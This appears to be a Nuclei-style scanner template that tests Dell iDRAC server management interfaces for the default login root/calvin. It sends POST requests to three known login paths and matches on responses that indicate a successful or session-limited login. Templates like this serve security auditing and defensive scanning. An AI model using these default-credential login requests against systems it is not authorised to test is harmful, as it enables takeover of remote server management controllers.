id: yaml-poc-dell-idrac-weak_password-CT-456768
info:
  name: Yaml Poc Dell Idrac Weak_Password Ct 456768
  author: converted
  severity: medium
  description: 'Converted from xpoc: yaml-poc-dell-idrac-weak_password-CT-456768'
  tags: default-login
  reference:
  - https://www.delltechnologies.com/en-us/solutions/openmanage/idrac.htm
http:
- method: POST
  path:
  - /data/login
  body: user=root&password=calvin
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - <forwardUrl>
    - The maximum number of user sessions has been reached!
  - type: regex
    part: body
    regex:
    - <authResult>[0|5]</authResult>
- method: POST
  path:
  - /cgi-bin/webcgi/login
  body: user=root&password=calvin&WEBSERVER_timeout=1800&WEBSERVER_timeout_select=1800
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - /cgi-bin/webcgi/index
    - Connection refused, maximum sessions already in use
- method: POST
  path:
  - /Applications/dellUI/RPC/WEBSES/create.asp
  body: WEBVAR_USERNAME=root&WEBVAR_PASSWORD=calvin&WEBVAR_ISCMCLOGIN=0
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - Failure_No_Free_Slot
  - type: regex
    part: body
    regex:
    - '''USERNAME''\\s*:\\s*''(.*)'''
